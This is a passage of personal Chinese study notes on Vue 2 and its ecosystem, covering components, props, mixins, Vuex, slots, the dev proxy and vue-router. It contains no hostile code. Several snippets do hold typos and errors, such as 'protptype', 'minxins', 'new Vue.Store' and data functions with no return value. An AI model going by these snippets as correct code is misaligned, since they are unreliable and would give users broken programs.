   - 可以使用name配置项指定组件在开发者工具中呈现的名字



**组件标签**

1. 第一种写法：<school></school>
2. 第二种写法：<school/>
3. 备注：不使用脚手架时<school/>会导致后续组件不能渲染



**简写方式**

> const school=Vue.extend(options) <==> const school=options



#### 组件的嵌套

 标准化开发中通常使用一个app组件管理其他的子组件，Vue只要管理一个组件就行了

```vue
<script>
//school组件
        const school=Vue.extend({
            template:`
            <div>
            <h2>学校名称：{{schoolName}}</h2>
            <h2>学校地址：{{address}}</h2>
            <button @click="showName">显示学校名</button>
<!--在school组件中使用student组件-->
            <student></student>
            </div>
            `,
            data(){
                return{
                    schoolName:'school',
                    address:'beijing'
                }
            },
            methods: {
                showName(){
                    alert(this.schoolName)
                }
            },
            components:{
                //在school组件中嵌套注册student组件
                student
            }
        })
        
//创建app组件
        const app=Vue.extend({
                    template:`
                    <div>
                    <school></school> 
                    </div>
                    `,
                    components:{
                        //嵌套注册school组件
                        school
                    }
                })
        


        

       new Vue({
           el:'#root',
           components:{
               app
           }
       })
</script>
```



#### VueComponet构造函数

- 组件的<u>本质</u>是一个名为VueComponent的<u>构造函数</u>，且不是被程序员定义的，是Vue.extend生成的。

- 我们只需要写<school></school>或</school>，Vue解析时会帮我们创建school组件的实例对象，即Vue帮我们执行 

  >  new VueComponent(options)

- 每次调用Vue.extend返回的都是一个全新的VueComponent
- this的指向
  - **组件配置**中，data函数，methods中的函数，watch中的函数，computed中的函数，它们的<u>this</u>都是【VueComponent实例对象】
  - **new Vue( )配置**中，data函数，methods中的函数，watch中的函数，computed中的函数，它们的<u>this</u>都是【Vue实例对象】





VueComponent的实例对象可以简称为vc（也可以称为组件实例对象）

Vue的实例对象可以简称为vm

vc和vm都有同名的方法，但是具体怎么实现的不是完全相同，组件是可以复用的vue实例



**一个重要的内置关系**

回顾原型链

```javascript
//定义一个构造函数
function Demo()
{
    this.a=1
    this.b=2
}

//创建一个实例对象
const d= new Demo()

console.log(Demo.protptype)		//显示原型属性【指向原型对象】
console.log(d.__proto__)		//隐式原型属性【指向原型对象】

Demo.prototype.x=99		//通过显示原型属性操作原型对象，追加一个x属性


```

> VueComponent.prototype.__ proto __==Vue.prototype

Vue没有将VueComponent的原型对象的__ proto __指向Object的原型对象，而是指向Vue的原型对象

![image-20221019094448494](C:\Users\pxy\Desktop\学习笔记\vue\img\Vue与VueComponent关系.png)

为什么要有这个关系？

**<u>让组件实例对象可以访问Vue原型上的属性，方法</u>**



#### 单文件组件（xxx.vue文件）

**标签**

- template【组件的结构】
- script【组件交互相关的代码】
- style【组件的样式】



注意：Vue后缀的文件不可以直接使用，浏览器不能直接解析，所以这里需要工具进行解析，这里要用到WebPack搭建环境或者使用Vue的脚手架（Vue团队搭建好的WebPack环境）



**Vue项目结构**

![image-20221019103756964](C:\Users\pxy\Desktop\学习笔记\vue\img\文件结构.png)



School组件

```vue
<template>
  <div class="school">
    <h2>学校名称:{{name}}</h2>
    <h2>学校地址:{{address}}</h2>
    <button @click="showName">点我显示学校</button>
  </div>
</template>

<script>
    //使用import引入文件需要使用export default将代码暴露
    export default {
        name:'School',
        data() {
            return {
                name:'school',
                address:'北京'
            }
        },
        methods: {
            showName(){
                alert(this.name)
            }
        },
    }
</script>

<style>
.school{
    background-color: pink;
}
</style>
```



App组件

```vue
<template>
  <div>
      <student></student>
      <school></school>
  </div>
</template>

<script>
//引入组件
import Student from './Student.vue'
import School from './School.vue'

export default {
    name:'App',
    components: { Student,School}

}
</script>

```



main.js

```js
//引入App组件
import App from './App.vue'
new Vue({
    template:`<app></app>`,
    el:"#root",
    components:{App}
})
```



html代码

```html
<body>
    <div id="root"></div>
    <script src="../../js/vue.js"></script>
    
    <script src="./main.js"></script>
</body>
```



App组件管理所有的子组件，main.js为Vue的入口文件，new的Vue对象写在main.js里面



### 脚手架

#### 安装步骤

1. 全局安装@vue/cli

   - npm install -g @vue/cli

   - 安装之后使用不了vue的命令，查看nodejs文件发现我把vue装在了node_globalnpm这个文件夹中。

     解决方法：新增一条path指向该文件夹

2. 切换到你要创建的目录创建脚手架

   - vue create 项目名称

3. 根据提示cd vue_test， npm run serve

4. 完成安装
     - 本机访问Local:   http://localhost:8080/
     - 同局域网访问Network: http://192.168.1.101:8080/



#### 脚手架结构

**配置文件**

![image-20221019151652183](C:\Users\pxy\Desktop\学习笔记\vue\img\vue脚手架配置文件.png)

- .gitignore
  - git的忽略文件
- babel.config.js
  - babel配置文件
  - ES6==>ES5
- package-lock.json        package.json
  - 包的说明书
- README.md
  - 项目描述



**src**

![image-20221019151723455](C:\Users\pxy\Desktop\学习笔记\vue\img\vue脚手架src.png)

- main.js
  - 执行完npm run serve之后直接执行这个文件
  - 该文件是整个项目的入口文件
  
- App.vue
  
- app.vue
  
  ```vue
  <template>
    <div id="app">
      <img alt="Vue logo" src="./assets/logo.png">
      <HelloWorld msg="Welcome to Your Vue.js App"/>
    </div>
  </template>
  
  <script>
  import HelloWorld from './components/HelloWorld.vue'
  
  export default {
    name: 'App',
    components: {
      HelloWorld
    }
  }
  </script>
  
  <style>
  #app {
    font-family: Avenir, Helvetica, Arial, sans-serif;
    -webkit-font-smoothing: antialiased;
    -moz-osx-font-smoothing: grayscale;
    text-align: center;
    color: #2c3e50;
    margin-top: 60px;
  }
  </style>
  ```
  
  
  
- assets
  
  - 存放静态资源（图片，视频....）
  
- components
  
  - 组件都放在这里



**public**

![image-20221019152631794](C:\Users\pxy\Desktop\学习笔记\vue\img\vue脚手架public.png)

网站图标和index.html

```html
<!DOCTYPE html>
<html lang="">
  <head>
    <meta charset="utf-8">
    <!-- 针对IE浏览器的一个特殊配置，让IE以最高级别渲染页面 -->
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <!-- 开启移动端理想视口 -->
    <meta name="viewport" content="width=device-width,initial-scale=1.0">
    <!-- 配置页面图标 -->
    <link rel="icon" href="<%= BASE_URL %>favicon.ico">
    <!-- 配置网页标题 -->
    <title><%= htmlWebpackPlugin.options.title %></title>
  </head>
  <body>
    <!-- 当浏览器不支持js时，noscript中的标签会重新渲染-->
    <noscript>
      <strong>We're sorry but <%= htmlWebpackPlugin.options.title %> doesn't work properly without JavaScript enabled. Please enable it to continue.</strong>
    </noscript>
    <!-- 容器视口 -->
    <div id="app"></div>
    <!-- built files will be auto injected -->
  </body>
</html>

```



#### main.js

```js
import Vue from 'vue'	//引入Vue
import App from './App.vue'

//阻止默认行为
Vue.config.productionTip = false

new Vue({
  render: h => h(App),
}).$mount('#app')   //相当于el:'#App'

```



**为什么要使用render函数**

这里import引入的vue是**残缺版**的，没有模板解析器（template解析器）

<u>解决办法</u>：

- 引入完整版
- 使用render函数

**render函数**

render是个函数，Vue会调用render函数，这个函数可以创建具体的元素。

> render(createElement){
>
> return createElement(‘h1','你好')
>
> }
>
> //简写成箭头函数
>
> render:createElement=>createElement(app)



**为什么不直接引入完整版vue**

vue由两个东西组成，一个是vue核心还有一个是模板解析器

vue完整版中模板解析器的代码占用了差不多三分之一

最终进行打包的时候模板解析器不用进行打包

为了打包的时候节省点空间所以使用残缺版的vue（缺少模板解析器）

使用render函数就相当于：

> 买瓷砖（Vue核心）+雇工人（模板解析器）===>铺好的瓷砖

使用完整版vue相当于：

> 买瓷砖（Vue核心）+买工人（模板解析器）===>铺好的瓷砖+工人



#### 修改默认配置（vue.config.js）

Vue脚手架隐藏了所有webpack相关配置，如果想要**查看webpack配置**（该文件不可修改），就要执行

> vue inspect > output.js

如果要**修改配置文件**那么在vue.config.js中进行修改直接将要修改的内容写入该文件之后该文件会将修改的内容与被隐藏起来的原内容进行比较，更改被隐藏的文件中的内容。（vue不允许直接触碰被隐藏的核心文件）

```js
module.exports={
    //修改入口文件配置项
    pages:{
        index:{
            //入口文件
            entry:'src/main.js'
        }
    },
    //关闭语法检查配置项
    lintOnSave:false
}
```



### ref属性

ref属性可以获取DOM元素,被用来给元素或子组件注册引用信息（id的替代者）

```html
<h1 v-text='msg' ref='title'></h1>

<script>
methods:{
    showDom(){
        console.log(this.$refs.title)
    }
}
</script>
```



- 如果给组件添加ref的话拿到的是组件的实例对象（vc）

- 如果给html标签添加ref的话拿到的是真实的DOM元素



### props配置项

可以通过props把子组件的data传递给父组件

当组件复用，但是里面的属性需要使用不同的数据的时候，可以使用props配置项来实现。

父组件==>子组件 通信

子组件==>父组件 通信（要求父组件先给子组件一个函数）

- 传递数据
  - <Demo name="xxx">
- 接收数据
  1. 只接收
     - props:['name']
  2. 限制类型
     - props:{name:Number}
  3. 限制类型，限制必要性，指定默认值
     - props:{name:{type:String,required:true,defaule:"小明“}}

Student.vue

```vue


<template>
  <div>
      <h2 v-text="msg" ref="title"></h2>
      <h2>学生姓名：{{name}}</h2>
      <h2>学生年龄：{{age}}</h2>
      <h2>性别：{{sex}}</h2>
  </div>
</template>
<script>
export default {
    name:"School",
    data() {
        return {
            msg:'你好啊',
        }
    },
    //第一种，简单接收
    props:['name','sex','age'],
	//第二种，对象接收
	props:{
        name:String,
        age:Number,
        sex:String
    },
    //第三种接收,类型指定，默认值显示，必要性限制
    props:{
        name:{
            type:String,	//name是字符类型
            required:true	//name是必要字段
        },
        sex:{
            type:String,	//sex是字符类型
            required:true	//sex是必要字段
        },
        age:{
            type:Number,	//age是字符类型
            default:99		//默认值为99
        }
    }
   
}
</script>
```



App.vue

```vue
<template>
  <div>
      <!-- 添加Student组件 -->
      <Student ref="Student" name="kitty" sex="女" :age="18"></Student>
      <hr>
      <Student ref="Student" name="tom" sex="男" :age="9"></Student>
  </div>
</template>
```

如果想要传入数字可以使用：age="18"这种v-bind的形式传入，因为v-bind传入的是引号内的内容

**注意：**

1. props是只读的，Vue底层会监测你对props的修改，如果进行了修改会发出警告（vue监视的是浅层次）
   - `obj.a=12`这种vue不会算作修改
   - `obj={x:1,y:2}`这种形式vue会算成修改
2. props的属性的优先级大于data属性的优先级
3. props传过来的若是对象类型，修改对象中的属性时Vue不会报错，但不推荐这样做
4. v-model绑定的值不能是props传递过来的值，因为**<u>props是不可修改的</u>**。

**如果要修改props的数据**

```vue
<template>
  <div>
      <h2 v-text="msg" ref="title"></h2>
      <h2>学生姓名：{{name}}</h2>
      <h2>学生年龄：{{myAge}}</h2>
      <h2>性别：{{sex}}</h2>
      <button @click="addAge">点我增加年龄</button>
  </div>
</template>
<script>
    export default{
        name:"school",
        data(){
            //利用myAge存储age
            myAge:this.age
        },
        methods:{
            addAge()
            {
                this.myAge++
            }
        }
    }
</script>
```



### mixin混入

两个组件共有的东西可以使用mixin进行混合复用，只需要在mixin中写一遍就行了。

mixin不会破坏你的代码，你的代码中有的mixin中也有那么以你的代码为主。

但是生命周期钩子来说都会使用。

mixin.js

```js
export const mixin1={
    methods:{
        showName()
        {
            alert(this.name);
        }
    }
}

export const mixin2={
    x:1,y:2
}
```



School.vue

```vue
<template>
<h2 @click="showName">学生名称：{{name}}</h2>
</template>
<script>
//引入mixin
import {mixin1,mixin2} from '../mixin'
export default{
    name:'School',
    data(){
        name:"school"
    },
    minxins:[mixin1,mixin2]
}
</script>
```



Student.vue

```vue
<template>
<h2 @click="showName">学生名称：{{name}}</h2>
</template>
<script>
//引入mixin
import {mixin1,mixin2} from '../mixin'
export default{
    name:'Student',
    data(){
        name:"tom"
    },
    minxins:[mixin1]
}
</script>
```



#### 全局混合

在main.js中进行混合，那么在项目中**所有**的vc，vm都会得到mixin

```js
//引入mixin
import {mixin1,mixin2} from '../mixin'

Vue.mixin(mixin1)
Vue.mixin(mixin2)
```



### 插件

插件的本质就是一个对象，插件必须包含install方法

plungins.js

```js
export default{
    install(Vue){
//mixin混入
Vue.mixin({
    data(){
        return(){
            x:1,
            y:2
        }
    }
})

//全局过滤器
Vue.filter('mySlice',funtion(value){
           return value.slice(0,4)
           })
           
//给Vue原型上添加方法（vm,vc都可以使用）
 Vue.prototype.hello=()=>{
     alert("hello")
 }
    }
}
```



main.js使用插件

```js
import plungins from './plungins'

//应用插件（可以使用插件里的功能了）
Vue.use(plungins)

```



### scoped样式

组件中的样式最终会汇总到一起，如果不同组件中有同名样式那么会发生冲突（后引入的会覆盖先引入的）

给style标签添加scoped标签那么就**不会产生冲突**。

scoped作用原理：给组件中的元素添加一个特殊的标签属性（该属性中的值为随机生成），该标签属性会和样式一起使用。

APP中的样式只有APP可以使用。

```vue
<template>
<h2 class='test'>
    school
    </h2>
</template>

<style scoped>
    .test{
        color:red;
    }
</style>
```



### 组件化编码流程案例

组件化编码流程

1. 实现静态组件：抽取组件，使用组件实现静态页面效果
2. 展示动态数据
   1. 数据的类型、名称是什么
   2. 数据保存在哪个组件里
3. 交互——从绑定事件监听开始



一个data或者函数等...一个组件在用放在组件自身即可，一些组件在用放在他们共同的父组件上（**状态提升**）



### 浏览器的本地存储

**WebStorage**

WebStorageb包括Window.localStorgae和Window.sessionStorage，浏览器端通过这两个属性来实现本地存储机制。

存储内容大小一般支持5MB左右（不同浏览器可能不同）

**localStorage**

打开浏览器控制台，在Application选项中有个Storage，可以在这里面找到localStorage

<u>关闭浏览器localStorage也不会消失(需要手动清除)</u>

localStorage最重要的是这几个API

- 存储数据
  - localStorage.setItem('msg','hello')
- 获取数据
  - localStorage.getItem('msg')
- 删除数据
  - localStorage.removeItem('msg')
- 清空数据
  - localStorage.clear()



```html
<button onclick="addStorage()">添加一个数据</button>
    <button onclick="delStorage()">删除一个数据</button>
    <button onclick="getStorage()">获取一个数据</button>
    <button onclick="claerStorage()">清除数据</button>
    <script>
        let p={name:"小明",age:20}
        //添加数据
        function addStorage(){
            localStorage.setItem('msg1','hello')
            localStorage.setItem('msg2',567)
            localStorage.setItem('person',JSON.stringify(p))
            console.log("123");
        }
        //删除数据
        function delStorage(){
            localStorage.removeItem('msg1')
        }
        //获取数据
        function getStorage(){
            let p= localStorage.getItem('person')
            console.log(JSON.parse(p));
        }

        //清除数据
        function claerStorage(){
            localStorage.clear();
        }
    </script>
```

 localStorage.getItem('xxx')，如果xxx对应的value值获取不到那么返回的是null值

**SessionStorage**

1. SessionStorage的使用方法和localStorage相同，通过SessionStorage.getItem()调用。
2. SessionStorage存储的内容会随着<u>浏览器窗口关闭清除</u>



### 组件的自定义事件



1. 一种组件间通信方式，适用于子组件===>父组件
   - 在父组件中给子组件绑定了自定义事件，子组件触发自定义事件。
2. 组件上绑定的事件默认为自定义事件，如果要绑定原生DOM事件那么需要使用**native修饰符**
3. 如果只想让事件触发一次那么可以使用once修饰符或$once方法
4. 通过this.$refs.xxx.$on('自定义事件名'回调函数)绑定自定义事件的时候回调函数要使用**箭头函数或者是配置在methods中**，这样this才能指向APP，否则this指向xxx

#### 绑定自定义事件

第一种绑定方法

> <Student @sendMsg="getStudentName"/>

- 当触发了sendMsg事件之后直接执getStudentName回调函数
- 在Student组件中通过` this.$emits.('sendMsg',this.name)`触发该事件并且把name作为参数传递给回调函数getStudentName

APP.vue

```vue
<template>
  <div>
      <h2>{{msg}},{{StuName}}</h2>
      <School @getSchoolName.once="getSchoolName"/>
      <Student ref="student"/>
  </div>
</template>

<script>
import School from './components/School.vue'
import Student from './components/Student.vue'
export default {
    name:"App",
    data() {
        return {
            msg:"你好啊",
            StuName:''
        }
    },
    components:{
        School,Student
    },
    methods:{
        getSchoolName(name){
            console.log("App接收到了学校名称：",name);
        },
        getStudentName(name){
            console.log("App接收到了学生姓名：",name);
            this.StuName=name
        }
    },
    mounted() {
        //监听getStuName事件
        this.$refs.student.$on('getStuName',this.getStudentName)
    },
}
</script>

<style>

</style>
```



Student.vue

```vue
<template>
  <div>
      <h2>学生名称：{{name}}</h2>
      <h2>学生年龄：{{age}}</h2>
      <button @click="sendStudentName">将学生名称传给APP</button>
  </div>
</template>

<script>
export default {
    name:'Student',
    data() {
        return {
            name:'小明',
            age:'20'
        }
    },
    methods:{
        sendStudentName(){
            //触发getStuName事件
            this.$emit('getStuName',this.name)
        }
    }
}
</script>

<style scoped>

</style>
```



School.vue

```vue
<template>
  <div>
      <h2>学校名称：{{name}}</h2>
      <h2>学校地址：{{address}}</h2>
      <button @click="sendSchoolName">将学校名称传给APP</button>
  </div>
</template>

<script>
export default {
    name:'School',
    data() {
        return {
            name:'school',
            address:'上海'
        }
    },
    methods:{
        sendSchoolName(){
            //触发getSchoolName事件
            this.$emit('getSchoolName',this.name)
        }
    }
}
</script>

<style scoped>

</style>
```





第二种绑定方法

> <Student ref="student"/>

- 当触发了sendMsg事件之后通过mounted钩子执行回调函数，回调函数体如下

- `this.$refs.student.$on("sendMsg",this.getStudentName)`



#### 解绑事件

通过this.$off()这个API解绑事件（这里的this是调用事件的组件Student）

- this.$off()
  - 解绑所有事件
- this.$off(‘send’)
  - 解绑一个事件
- this.$off(['send','getMsg'])
  - 解绑多个事件



注意：当vue实例被销毁之后自定义事件会被销毁，但是先前绑定的原生事件不会被销毁



### 全局事件总线（GlobalEventBus）

实现任意组件间通信

全局事件总线本质是借助所有组件外部的$bus组件给外部的组件绑定事件，触发事件。

**安装全局事件总线**

```js
new Vue({
    .......
    beforeCreare(){
    Vue.protptype.$bus=this	//安装全局事件总线，$bus是当前应用的vm
}
	......
})
```



**使用事件总线**

1.接收数据（A组件想接收数据则在A组件中给$bus绑定自定义事件，事件的回调留在A组件自身）

```js
methods(){
    demo(data){}
},
mounted(){
    //给$bus绑定事件，通过this.demo的回调拿到数据
    this.$bus.$on('xxx',this.demo)
}
```

2.提供数据

` this.$bus.$emit('xxx',数据)`



tip：最好在beforeDestroy钩子中用$off去解绑当前组件所用到的事件



### 消息订阅与发布

可以实现全局总线的功能

pubsub-js这个库可以实现消息的订阅和发布

安装pubsub ：`npm i pubsub-js`

引入：`import pubsub from pubsub-js`

1. 需要收到数据的组件订阅消息
   - ` this.pubId=pubsub.subscribe('hello',(msgName，data)=>{//订阅了hello消息执行了回调})`
2. 传递数据的组件发布消息
   - ` pubsub.publish('hello',数据)`

注意，组件使用完成之后最好取消订阅事件。在beforeDestroy钩子中取消

` pubsub.unsubscribe(this.pubId)`



- $nextTick(function(){})
  - 这个API会在下一次DOM更新结束之后执行其指定的回调



### Vue动画

```vue
<template>
<div>
    <button @click="isShow=!isShow">显示/隐藏</button>
    <!-- 在这个标签中Vue会自动匹配动画 -->
    <transition>
            <h1 v-show="isShow">你好呀</h1>
    </transition>
</div>
</template>

<script>
export default {
    name:'test',
    data() {
        return {
            isShow:true
        }
    },
}
</script>

<style scoped>
h1{
    background-color: orange;
}
/* 进入动画要写成v-enter-active*/
/* 如果给transition一个name属性，那么要写成 name-enter-active */
.v-enter-active{
    animation: test 1s;
}
/* 离开动画要写成 v-leave-active */
.v-leave-active{
    animation: test 1s reverse;
}
@keyframes test {
    from{
        transform: translateX(-100%);
    }to{
        transform: translateX(0px);
    }
}
</style>
```



### 配置代理

解决Ajax跨域问题

有以下几种方法

- cors
- jsonp script src
- 代理服务器

8080服务器<==>代理服务器（8080）<==>要请求的服务器（5000）

如果要请求5000服务器上的数据，那么要通过代理服务器8080请求。代理服务器同样能请求public文件夹中的内容。所以如过public文件夹中有和5000服务器中同名的文件那么代理服务器请求到的为public文件夹中的文件。

**利用vue-cli开启代理服务器**

在vue.config.js进行配置

```js
//方式一
//开启代理服务器(不能配置多个代理，不能控制走不走代理)
  devServer:{
    proxy:'http://localhost:5000'
  }

//方式二
devServer:{
        proxy:{
          '/api':{
                target:'http://localhost:5000',
                pathRewrite:{
                  //路径重写，将/api都变为空
                  '^/api':''},
                ws:true	//用于支持websocket
                changeOrigin:true	//用于控制请求中的host字段的值
                }
            }
  		}
```



```js
methods:{
    getStudent(){
            axios.get('http://localhost:8080/students').then(response=>{
                console.log('成功获取学生信息',response.data);
            },err=>{
                console.log('失败',err.msg);
            })
        },
    }
```



### v-resource(ajax库)

是vue中的插件库，官方不再维护,vue1.0中使用较多，了解即可

1. 安装
   - npm i vue-resource
2. 引入
   - import vueResource from 'vue-resource'
3. 声明插件
   - vue.use(vueResource)
4. 使用
   - 使用方法和axios一模一样，axios.get()变为this.$http.get()



### slot插槽

#### 默认插槽

在组件template标签中使用

Category.vue

```html
<template>
    <!-- 定义一个插槽（挖个坑，等组件使用者进行填充）-->
<slot>我是默认值，当使用者没有传递具体结构时我会出现</slot>
</template>
```

App.vue

```vue
<template>
<Category>
    <!--img就会出现在slot的位置-->
	<img src="xxx">    
</Category>
</template>
```



#### 具名插槽

当有多个标签需要插入的时候，这里可以使用具名插槽

Category.vue

```vue
<template>
<slot name="center"></slot>
<slot name="footer"></slot>
</template>
```

App.vue

```vue
<template>
<Category>
	<img slot="center" src="xxx"> 
    <!--在template标签中也可以写成v-slot:footer(只可以在template标签中这么写)-->
    <template slot="footer">
		<ul>
        	<li>xxx</li>    
            <li>xxx</li>    
    	</ul>	
        <h3>你好啊！</h3>
	</template>
</Category>
</template>
```



#### 作用域插槽

当要使用的数据不在App组件，那么可以使用作用域插槽

Category.vue

```vue
<template>
<slot :games="games"></slot>
</template>
<script>
export default{
    data(){
        games:['1','2','3']
    }
}
</script>
```



App.vue

```vue
<template>
<Category>
    <!--注意，如果要接收数据那么必须使用template标签包裹-->
    <template scope="receive">
        <ul>
            <li v-for="(g,index) in receive.games" key="index">{{g}}</li>
    	</ul>
	</template>
</Category>
</template>
```



### Vuex

专门在Vue中实现集中式状态（数据）管理的**插件**` (Vue.use(Vuex))`，对Vue应用中多个组件的共享状态进行集中式的管理（读、写），也是一种组件间通信的方式，且适用于任意组件间通信。

如果多个组件需要使用同一个数据的时候，可以利用Vuex

![vuex](C:\Users\pxy\Desktop\学习笔记\vue\img\vuex.png)

**store**管理action，mutations，state

1. vm调用dispatch这个api告诉actions(对象)，方法名和数据，actions触发add这个函数,当传递数据从后端来的时候，actions可与后端交互

   - > store.dispatch('add',2)

2. actions调用commit这个api，这时候流程走到mutations这里，mutations是一个对象，其中存储着add函数，add函数可以拿到state和数据2
3. mutations中的add函数中写`state.sum+=2`,那么state中存储的sum就发生了改变。
4. 之后vuex重新解析组件，进行渲染



vue2中要使用vuex3,vue3中要使用vuex4

> npm i vuex@3



#### 搭建vuex环境

创建store文件夹==>创建index.js文件

index.js

```js
//引入Vue
import Vue from 'vue'
//引入Vuex
import Vuex from 'vuex'

//应用Vuex插件
Vue.use(Vuex)

//准备actions对象，用于响应用户的动作
const actions={}
//准备mutations对象，用于修改state中的数据
const mutations={}
//准备store对象，用于存储用户数据
const store={}

//创建并暴露store对象
export default new Vue.Store({
    actions,
    mutations,
    store
})
```

之后在main.js中import引入store并在创建vue实例对象的时候声明。



#### Vuex的使用

```js
//在组件
methods:{
        increment(){
            //调用dispatch这个api通知action
            this.$store.commit('ADD',this.n)
        },
        decrement(){
            this.$store.commit('SUB',this.n)
        },
        oddIncrement(){
            this.$store.dispatch('odd',this.n)
        },
        waitIncrement(){
            this.$store.dispatch('wait',this.n)
        }

    }

//vuex
//准备actions对象，用于响应用户的动作
const actions={
    // //dispatch通知到了action，这里进行操作
    // add(context,value){
    //     //调用commit这个api通知mutations
    //     //context相当于一个miniStore，存储了dispatch和commit还有state等
    //     context.commit('ADD',value)

    // },
    // sub(context,value){
    //     context.commit('SUB',value)
    // },
    
    odd(context,value){
        //上下文中存储着state
        if(context.state.sum %2){
            context.commit('ODD',value)
        }
    },
    wait(context,value){
        setTimeout(()=>{
            context.commit('WAIT',value)
        },500)
    }
}
//准备mutations对象，用于修改state中的数据
const mutations={
    ADD(state,value){
        //对state中的数据进行操作
        state.sum+=value
    },
    SUB(state,value){
        state.sum-=value
    },
    ODD(state,value){
        state.sum+=value
    },
    WAIT(state,value){
        state.sum+=value
    }
}
//准备state对象，用于存储用户数据
const state={
    sum:0,
}

//创建并暴露store对象
export default new Vuex.Store({
    actions,
    mutations,
    state
})
```

注意：

1. 当需要进行if判断,设置定时器等业务逻辑操作的时候需要在actions中进行操作，mutations中只负责对数据的操作。
2. 如果不需要actions那么在组件中可以直接和mutations进行对话 ` this.$store.commit('JIA',this.n)`

#### getters配置项

getters可以将**state中的数据进行加工**，和计算属性的使用方法类似，都是通过return返回值来决定值

```js
const getters={
    mulSum(state){
        return state.sum*10
    }
}

export default new Vuex.Store({
    actions,mutations,state,getters
})
```

在组件中使用：` $store.getters.mulSun`

#### mapState

如果模板中需要使用state中的数据，那么直接将`this.$store.state.xxx`写在模板中会太长了（模板中最好不要写太长的语句），所以这里要用到计算属性

```js
//使用
{{school}}
//计算属性
computed:{
    add(){
        return this.$store.state.sum
    },
    school(){
        return this.$store.state.school
    },
    job(){
        return this.$store.state.job
    }
}
```

观察以上计算属性中的代码可以发现，这些代码前面相同，只有最后的后缀不同，所以这里可以通过Vuex中的mapState来实现以上计算属性中的代码

```js
//导入mapState
import {mapState} from 'vuex'

export default{
    computed:{
        //es6中...可以将对象中的属性拆分出来
        //借助mapState生成计算属性，从state中读取数据（对象写法）
       ...mapState({
            add:'sum',
            school:'school',
            job:'job'
        }),
        //数组写法(生成的计算属性名和state中属性名要相同)
        ...mapState(['sum','school','job'])
    }
}
```



#### mapGetters

用于映射getters中的数据为计算属性

```js
import {mapGetters} from vuex
computed:{
    //对象写法
    ...mapGetters({mulSum:'mulSum'})
    //数组写法
    ...mapGetters(['mulSum'])
}
```



#### mapActions

借助mapActions生成对应的方法，方法中会**调用dispatch函数**去联系actions

```js
import {mapActions} from vuex
methods:{
     oddIncrement(){
            this.$store.dispatch('odd',this.n)
        },
        waitIncrement(){
            this.$store.dispatch('wait',this.n)
        }
 
    //以下代码可以替代以上代码
  	//对象写法
    ...mapActions(oddIncrement:'odd',waitIncrement:'wait')
    //数组写法
    ...mapActions('odd','wait')
    @click='odd(n)'
}
```



#### mapMutations

借助mapMutations生成对应的方法，方法中会**调用commit函数**去联系mutations

```js
import {mapMutations} from vuex
methods:{
// increment(){
//     this.$store.commit('JIA',this.n)
// },
// decrement(){
 //    this.$store.commit('JIAN',this.n)
// }
   
 //以下代码可以替代以上代码   
 
 //对象写法
    ...mapMutations({increment:'JIA',decrement:'JIAN'})
 //数组写法
 ...mapMutions['JIA','JIAN']
 @click= "JIA(n)"
}
```

要注意的是使用`mapMutations`这个函数并没有传入参数，所以在绑定事件的时候要传入参数，原来的写法`@click="increment"`，现在的写法是`@click=increment(n)`将参数传入



#### 多组件共享数据



#### 模块化编码+命名空间

目的是让代码更好维护，让多种数据分类更加明确

**开启命名空间**

```js
const countAbout={
    namespaced:true,	//开启命名空间
    state:{},
    mutations:{},
    actions:{},
    getters:{}
}

const personAbout={
     namespaced:true,	//开启命名空间
    state:{},
    mutations:{},
    actions:{},
    getters:{}
}

const state=new Vuex.Store({
    //这种方法声明命名空间
    modules:{
        countAbout,
        personAbout
    }
})
```

**开启命名空间后，组件中读取state数据：**

```js
//自己直接读取
this.$store.personAbout.xxx
//借助mapState读取
...mapState('countAbout',['sum','school'])
```

**开启命名空间后，组件中读取getters数据：**

```js
//自己直接读取
this.$store.getters['personAbout/xxx']
//借助mapGetters读取
...mapGetters('countAbout',['bigSum'])
```

**开启命名空间后，组件中调用dispatch方法联系actions**

```js
//dispatch
this.$store.dispatch('personAbout/addPersonWang',person)
//mapActions
...mapActions('countAbout',{incrementOdd:'odd',incrementWait:'wait'})
```

**开启命名空间后，组件中调用commit方法联系mutations**

```js
//commit
this.$store.commit('personAbout/add',person)
//mapMutations
...mapMutations('countAbout',{increment:'JIA',decrement:'JIAN'})
```



### 路由

**vue-route**是一个插件库

安装：`npm i vue-router`

使用：`Vue.use(vue-route)`

**单页面应用**

1. 整个页面只有一个完整的页面
2. 点击页面中的导航栏不会刷新，页面只会做局部更新
3. 数据通过ajax请求获取

**路由的理解**

路由实质上是一对`key:value`，对于vue来说**key**就是网址后面的路径如`www.baidu.com/class`中的**/class**,**value**就是不同的页面**组件**或**函数**

<u>前端路由：</u>

1. value是component，用于展示页面内容
2. 工作过程：当浏览器的路径改变时，对应的组件就会显示

<u>后端路由：</u>

1. value是function，用于处理客户提交的请求
2. 工作工程：服务器接收到一个请求时，根据请求路径找到匹配的函数来处理请求，返回响应数据



#### 基本使用

1. 安装router

   - 如果是vue3那么要使用router@4
   - 如果是vue2那么要使用router@3
   - npm i vue-router@3

2. 修改main.js

   ```js
   //引入VueRouter插件
   import VueRouter from 'vue-router'
   //引入路由器
   import router from './router'
   
   new Vue({
      //声明路由器
     router:router,
   })
   ```

3. 创建路由器文件

   - 在src中创建路由器文件，在该文件夹中创建index.js文件

   ```js
   //这里的代码用来定义一个路由器
   //引入VueRouter
   import VueRouter from 'vue-router'
   //引入组件
   import About from '../components/About'
   import Home from '../components/Home'
   
   //创建并暴露router
   export default new VueRouter({
       //写入路由
       routes:[
           {
               path:'/about',
               component:About
           },
           {
               path:'/home',
               component:Home
           }
       ]
   })
   ```

4. 在APP文件中使用路由

   ```vue
   <template>
     <div>
       <!-- 和a标签类似，浏览器中会渲染成a标签-->
       <!-- to为path路径 -->
       <router-link to="/home">home</router-link>
       <router-link to="/about">about</router-link>
       <!-- 用于展示组件 -->
       <router-view></router-view>
     </div>
   </template>
   ```

**命名路由**

给路由命名的时候可以简化编码，在router-link标签中的path属性可以变为name

```js
routers:[
    {
        name:'xiangqing',
        path:'/about',
        components:About
    }
]
```

``



**注意点：**

1. 路由组件：由路由器渲染的组件

   一般组件：自己写标签的组件

   开发中为了区分，会把这两种类型的组件分开放，路由组件放在pages，一般组件放在components

2. 切换组件实质上是不断销毁挂载的过程，切换到下一个组件：先是上一个组件销毁，然后是下一个组件挂载

3. 路由组件身上都有route和router属性，route不同，但是router都相同（只能有一个路由器）







#### 嵌套路由（多级路由）

router配置

```js
export default new VueRouter({
    routes:[
        {
            //一级路由
            path:'/parent',
            component:Parent,
            //二级路由
            children:[
                {
                    //注意：这里的path没有斜杠
                    path:'child',
                    component:Child
                }
            ]
        }
    ]
})
```



使用

